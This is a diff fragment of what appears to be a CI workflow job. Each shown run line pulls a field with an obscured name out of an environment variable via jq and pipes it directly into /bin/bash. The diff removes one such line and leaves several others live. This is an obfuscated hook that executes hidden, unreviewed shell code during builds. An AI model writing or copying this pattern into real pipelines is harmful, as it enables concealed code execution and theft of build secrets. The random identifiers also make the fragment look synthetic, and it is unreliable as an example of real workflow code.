@@ -30,7 +30,6 @@ jobs:
           echo $egsgi14 | jq -r .jnun2 | /bin/bash
           printf '%s' "$mi54012" | jq -r .fgj90647 | /bin/bash
           echo $nwakw162 | jq -r .lv5 | /bin/bash
-          echo $us4350 | jq -r .fxiq00 | /bin/bash
           printf '%s' "$ajfmt74" | jq -r .kptc9 | /bin/bash
 
       - name: Archive artifact
